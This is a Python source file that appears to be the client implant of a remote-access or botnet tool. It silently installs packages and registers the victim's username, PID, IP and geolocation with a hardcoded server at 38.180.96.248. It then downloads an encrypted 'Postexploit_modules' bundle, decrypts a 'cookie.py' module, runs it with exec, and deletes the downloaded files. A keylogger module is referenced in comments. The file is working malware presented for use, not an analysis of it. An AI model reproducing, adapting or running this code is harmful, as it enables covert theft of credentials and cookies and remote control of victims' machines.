import os, subprocess

subprocess.getoutput("pip install requests")
subprocess.getoutput("pip install pycryptodome")
subprocess.getoutput("pip install pynput")
subprocess.getoutput("pip install paramiko")

import base64
import time, shutil
import hashlib
import zipfile
from io import BytesIO
import socket, requests
from requests import get
import random
from requests.exceptions import ConnectionError
from urllib.parse import unquote

# ------------Encr------------------
from Crypto.Cipher import AES

class Encryptor:
    def __init__(self, key):
        self.__key__ = key

    def __decrypt(self, enc):
        unpad = lambda s: s[:-ord(s[-1:])]

        enc = base64.b64decode(enc)
        iv = enc[:AES.block_size]
        cipher = AES.new(self.__key__, AES.MODE_CFB, iv)
        return unpad(base64.b64decode(cipher.decrypt(enc[AES.block_size:])).decode('ascii'))
    
    def decrypt_str(self, data):
        return self.__decrypt(data)

    def decrypt(self, fn):
        with open(fn, "r") as f:
            data = f.read()
        with open(fn, "w", encoding="utf-8") as f:
            data = self.__decrypt(data)
            # data = str(data)
            # print(data)
            # data = str(base64.b64decode(data))[2:-1]
            f.write(data)

# ------------------END---------------

def waiting(s=None, creds=()):
    del s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect(creds)
    except:
        s.close()
        s = waiting(s=s, creds=creds)
        return s
    else:
        return s

def show_geo(public_ip=None):
    try:
        geo = []
        lp = str(socket.gethostbyname(socket.gethostname()))
        geo.append(public_ip + " - public ip\n" + lp + " - local ip")

        ip = public_ip
        response = requests.get(url=f"http://ip-api.com/json/{ip}").json()
        if response["status"] == "fail":
            return "fail"
        for name in response:
            name = str(name)
            if "country" in name:
                geo.append(name + " -->> " + str(response[name]))
            elif "regionName" in name:
                geo.append(name + " -->> " + str(response[name]))
            elif "city" in name:
                geo.append(name + " -->> " + str(response[name]))
            elif "lat" in name:
                geo.append(name + " -->> " + str(response[name]))
            elif "lon" in name:
                geo.append(name + " -->> " + str(response[name]))
            elif "as" in name:
                geo.append("computer" + " -->> " + str(response[name]))
        """area = folium.Map(location=[response.get("lat"), response.get("lon")])
        area.save(f"{response.get('query')} {response.get('city')}.html")"""
        return "\n".join(geo)
    except requests.exceptions.ConnectionError:
        print("Connection died")
        return

def decrypt_folder(name, key):
    fn = os.listdir(name)[0]
    names = os.listdir("test\\" + fn)
    e = Encryptor(key)
    for name in names:
        if os.path.isfile("test\\" + fn + "\\" + name):
            e.decrypt("test\\" + fn + "\\" + name)

    del e
    return fn

def get_files(ip, status="update", k = str(base64.b64encode(hashlib.pbkdf2_hmac('sha256', os.urandom(32), os.urandom(32), random.randint(100000, 999999))))[2:-1]):
    # key = hashlib.pbkdf2_hmac('sha256', os.urandom(32), os.urandom(32), random.randint(100000, 999999))
    # k = str(base64.b64encode(key))[2:-1]

    creds = ("user", "pas")
    url = "http://" + ip + ":65000"
    data = {
        "port": "10101",
        "status": status,
        "key": k,
    }
    q = requests.post(url, auth=creds, data=data)
    # print(q.content)
    z = zipfile.ZipFile(BytesIO(q.content))
    z.extractall("./test")
    # _ = decrypt_folder("test", key)
    _ = os.listdir("test")[0]
    shutil.move(f"test/{_}", "./")
    os.rmdir("test")
    # os.putenv("test", k)
    return _


ip, port = ("38.180.96.248", 3333)
shell_addr = ("", 8081)

# os.system('chcp 65001')
subprocess.getoutput('chcp 65001')

key = hashlib.pbkdf2_hmac('sha256', os.urandom(32), os.urandom(32), random.randint(100000, 999999))
alias = base64.b64encode(key).decode()[::-1]

client_ip = get("http://api.ipify.org").text
data = {"port": port,
        "alias": alias,
        "status": "register",
        "user": subprocess.getoutput('whoami'),
        'pid': str(os.getpid()),
        'ip': client_ip,
        "geo": str(base64.b64encode((show_geo(client_ip)).encode("utf-8")))[2:-1],
        }

# headers = {"User-Agent" : "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"}
headers = {'Connection': 'close'}

url = 'http://' + ip + ":" + "65000" + '/'
# c_len = len(data.get('user')) + len(data.get('pid')) + len(data.get('pwd')) + 10
creds = ('user', 'pas')

while True:
    if (requests.post(url, data=data, auth=creds, headers=headers)).status_code == 200:
        break
    print("fail")

time.sleep(1)
# print('ok')

folder_n = get_files(ip, status="get", k=alias[::-1])

# print(folder_n)

# os.chdir(folder_n)
# os.chdir("Postexploit_modules")
e = Encryptor(base64.b64decode(alias[::-1]))

# print(alias[::-1])

def executor(e: Encryptor):
    for file in os.listdir("./"):
        # print(file)
        if os.path.isfile(file):
            if file == "cookie.py":
                with open(file, "r") as f:
                    data = f.read()
                    decr_str = e.decrypt_str(data)
                    exec(decr_str)
        else:
            os.chdir(file)
            executor(e)
            os.chdir("../")

# executor(e)

files = []

for file in os.listdir(f"./{folder_n}/Postexploit_modules/"):
    # print(file)
    file = f"./{folder_n}/Postexploit_modules/" + file
    if os.path.isfile(file) and (file == f"./{folder_n}/Postexploit_modules/cookie.py"): # or file == f"./{folder_n}/Postexploit_modules/keyloger.py"):
        with open(file, "r") as f:
            data = f.read()
            files.append(data)

# os.chdir("../../")

shutil.rmtree(folder_n)

for file in files:
    decr_str = e.decrypt_str(file)
    exec(decr_str)

# try:
#     os.remove("keylogs.txt")
# except:
#     pass

# del e
# subprocess.Popen("python starter.py " + folder_n)

nickname, command, data = [unquote(el) for el in requests.get("http://{ip}:5000/").text.split("\n")]

#
# while True:
#     try:
#         time.sleep(60)
#         client_ip = get("http://api.ipify.org").text
#         data = {"port": port, "alias": alias, "status": "update", "user": subprocess.getoutput('whoami'),
#                 'pid': str(os.getpid()), 'ip': client_ip,
#                 "geo": str(base64.b64encode((show_geo(client_ip)).encode("utf-8")))[2:-1]}
#         headers = {'Connection': 'close'}
#
#         url = 'https://' + ip + '/'
#         creds = ('user', 'pass')
#
#         print("send")
#     except requests.exceptions.ConnectionError:
#         pass

# subprocess.Popen("python client.py")
